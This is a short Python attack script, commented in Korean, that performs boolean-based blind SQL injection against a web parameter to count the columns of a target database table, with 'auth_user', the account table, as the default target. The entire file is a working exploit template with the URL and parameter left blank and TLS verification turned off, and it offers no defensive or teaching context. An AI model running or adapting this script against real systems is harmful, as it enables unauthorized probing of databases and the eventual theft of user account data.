import requests

URL = ""
PARAM = ""
TRUE_INDICATOR = ""

def send_payload(payload):
    r = requests.get(URL, params={PARAM: payload}, verify=False)
    return r.text

def is_true(payload):
    return TRUE_INDICATOR in send_payload(payload)

def get_column_count(table_name, max_count=50):
    """특정 테이블의 컬럼 개수를 Blind SQLi로 확인"""
    for i in range(1, max_count+1):
        payload = (
            f"x' OR (SELECT COUNT(*) FROM information_schema.columns "
            f"WHERE table_name='{table_name}')={i}-- -"
        )
        if is_true(payload):
            return i
    return None

if __name__ == "__main__":
    table_name = "auth_user"  # 계정 테이블
    col_count = get_column_count(table_name)
    print(f"[+] Column count in {table_name}: {col_count}")
